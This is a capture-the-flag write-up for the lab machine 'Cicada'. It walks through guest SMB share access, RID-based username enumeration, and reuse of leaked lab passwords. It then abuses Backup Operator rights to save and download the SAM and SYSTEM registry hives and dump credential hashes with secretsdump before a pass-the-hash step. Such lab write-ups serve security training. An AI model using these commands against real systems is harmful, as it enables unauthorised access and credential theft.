# Cicada - Username enumeration key / Backup Operator - Reg hklm save

```bash
netexec smb 10.10.11.35 -u 'guest' -p '' --shares
```

[image]

```bash
smbclient //10.10.11.35/HR
```

[image]

Password found but no username yet.

Password is: `Cicada$M6Corpb*@Lp#nZp!8`

[image]

## Domain username enumeration

```bash
impacket-lookupsid guest@10.10.11.35 -no-pass
```

[image]

**michael user has no access to SMB shares:**

```bash
netexec smb 10.10.11.35 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --shares
```

[image]

## Enumerate Domain Users and metadata

Found this: *Just in case I forget my password is aRt$Lp#7t*VQ!3*

```bash
netexec smb 10.10.11.35 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```

[image]

## DEV share is readable

```bash
netexec smb 10.10.11.35 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares
```

[image]

Then access DEV share and found **Backup_script.ps1**.

There is emily credential: **emily.oscars:Q!3@Lp#M6b7tVt**

[image]

## Privilege Escalation

```bash
smbclient //10.10.11.35/C$ -U emily.oscars
```

[image]

**Backup Operator** group member, so we can save registry hives:

```bash
whoami /all
```

[image]

```bash
# saving
reg save HKLM\SAM sam
reg save HKLM\SYSTEM system

# transfer to attacker machine
download system
download sam

# dumping whole users credentials
impacket-secretsdump -sam sam -system system LOCAL
```

[image]

## Pass the Hash

[image]
